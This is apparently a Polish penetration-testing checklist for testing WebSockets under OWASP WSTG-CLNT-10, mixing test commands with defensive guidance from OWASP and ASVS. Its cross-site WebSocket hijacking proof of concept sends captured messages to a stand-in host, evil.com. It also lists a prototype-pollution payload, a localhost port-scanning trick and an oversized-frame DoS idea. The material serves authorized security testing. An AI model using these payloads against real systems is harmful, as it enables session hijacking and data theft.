# WSTG-CLNT-10 — Testing WebSockets

## Cele

- Identify the usage of WebSockets
- Assess its implementation by using the same tests on normal HTTP channels

## KOMENDY

### Identyfikacja WebSocket

```bash
curl -sI "https://TARGET/" | grep -i "upgrade\|websocket"
# Szukaj ws:// i wss:// w kodzie JS

```

### wscat - interakcja z WebSocket

```bash
wscat -c "wss://TARGET/ws"

```

### Test CSWSH (Cross-Site WebSocket Hijacking)

```bash
# Stworz PoC HTML:
# <script>var ws = new WebSocket('wss://TARGET/ws'); ws.onmessage=function(e){fetch('http://evil.com/?data='+e.data)}</script>

```

### Test injection via WebSocket

```bash
# Wyslij XSS/SQLi payloady przez WebSocket connection

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings Web Sockets

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Web Sockets/README.md

```

### Reuse injection payloads z INPV testow

```bash

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Uzyj Burp WebSocket History tab
2. Sprawdz czy WS wymaga autentykacji
3. Testuj CSWSH - czy WS waliduje Origin
4. Wyslij injection payloady (XSS, SQLi) przez WS
5. Sprawdz czy dane z WS sa sanityzowane przed renderowaniem


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — WebSocket_Security_Cheat_Sheet.md

### Cross-Site WebSocket Hijacking (CSWSH)

- Analogiczny do CSRF ale dla WebSocket — atakujacy inicjuje WS connection z przegladarki ofiary
- WebSocket handshake jest HTTP request — przegladarka automatycznie dolacza cookies
- Jesli serwer nie waliduje **Origin header** — atakujacy moze nawiazac polaczenie z dowolnej strony
- **Obrona**: waliduj Origin header w handshake — odrzuc jesli nie pochodzi z zaufanej domeny

### Transport Security

- **WSS (WebSocket Secure)** zamiast WS — szyfrowany kanal (TLS)
- WS bez szyfrowania = dane w plaintext — atakujacy MitM moze odczytac/modyfikowac wiadomosci
- Ustaw cookies sesji z flagami: `Secure`, `HttpOnly`, `SameSite`

### Autentykacja i autoryzacja

- **Uwierzytelniaj** polaczenia WebSocket **NIEZALEZNIE** od HTTP session
- Przekaz token w pierwszej wiadomosci WS lub w query string handshake (mniej bezpieczne — logi)
- Sprawdzaj uprawnienia na KAZDEJ wiadomosci — nie tylko przy handshake
- Implementuj session timeout na WS — polaczenie nie powinno zyc wiecznie

### Input Validation na wiadomosciach

- **Waliduj WSZYSTKIE wiadomosci** po stronie serwera — WS to dwukierunkowy kanal
- Testuj injection: XSS, SQLi, command injection — w wiadomosciach WS
- Sprawdz czy dane z WS sa **sanityzowane przed renderowaniem** w DOM (XSS via WS)
- Waliduj format: JSON schema validation, typ danych, dlugosc

### Rate Limiting i DoS

- Implementuj **rate limiting na wiadomosci** — zapobiegaj flooding
- Ogranicz rozmiar wiadomosci — zapobiegaj memory exhaustion
- Ustaw max jednoczesnych polaczen per uzytkownik/IP
- Implementuj heartbeat/ping-pong — wykrywaj i zamykaj martwe polaczenia

### Logging

- Loguj handshake (Origin, IP, UA, timestamp)
- Loguj anomalie: duza ilosc wiadomosci, nieprawidlowe formaty, proby injection

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| SocketSleuth | Zaawansowane testowanie WebSocket w Burp | [GitHub](https://github.com/snyk/socketsleuth) |
| WebSocket Turbo Intruder | Fuzzowanie WebSocket z custom kodem | [GitHub](https://github.com/Hannah-PortSwigger/WebSocketTurboIntruder) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V4.4.1 | WebSocket | Verify that WebSocket over TLS (WSS) is used for all WebSocket connections. |

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V4.4.2 | WebSocket | Verify that, during the initial HTTP WebSocket handshake, the Origin header field is checked against a list of origins allowed for the application. |
| V4.4.3 | WebSocket | Verify that, if the application's standard session management cannot be used, dedicated tokens are being used for this, which comply with the relevant Session Management security requirements. |
| V4.4.4 | WebSocket | Verify that dedicated WebSocket session management tokens are initially obtained or validated through the previously authenticated HTTPS session when transitioning an existing HTTPS session to a WebSocket channel. |


---

## HackTricks Tips

- **CSWSH (Cross-Site WebSocket Hijacking)**: jeśli auth cookie-only bez CSRF token i `SameSite=None` → open cross-origin WS z malicious page
- **Origin check disabled**: jeśli `CheckOrigin` always returns `true` (Gorilla, etc.) → any page otwiera socket
- **Localhost port scanning**: brute ports 20000-36000 z `new WebSocket("ws://127.0.0.1:PORT/")`, detect `onopen`
- **Prototype pollution via Socket.IO**: `{"__proto__":{"initialPacket":"Polluted"}}`
- **DoS Ping of Death**: WS frame z `Integer.MAX_VALUE` payload length bez body → OOM crash
- **Race conditions**: WebSocket Turbo Intruder z `THREADED` engine
- **Tool**: STEWS (`PalindromeLabs/STEWS`) — auto-discover i fingerprint WS endpoints
